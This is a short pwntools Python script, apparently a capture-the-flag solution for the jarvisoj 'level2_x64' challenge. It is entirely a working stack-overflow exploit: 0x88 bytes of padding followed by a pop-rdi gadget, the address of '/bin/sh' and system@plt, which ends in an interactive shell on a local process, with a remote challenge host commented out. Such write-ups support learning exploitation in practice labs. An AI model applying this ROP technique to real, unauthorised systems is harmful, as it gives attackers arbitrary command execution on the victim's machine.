from pwn import *

#n = remote('pwn2.jarvisoj.com',9882)
n = process('./level2_x64')
elf = ELF('./level2_x64')

sys_plt = elf.plt['system']
sh_addr = elf.search('/bin/sh').next()

pop_rdi_ret_addr = 0x00000000004006b3

offset = 0x88

payload = 'a' * offset + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(sys_plt)

n.recv()
n.sendline(payload)
n.interactive()
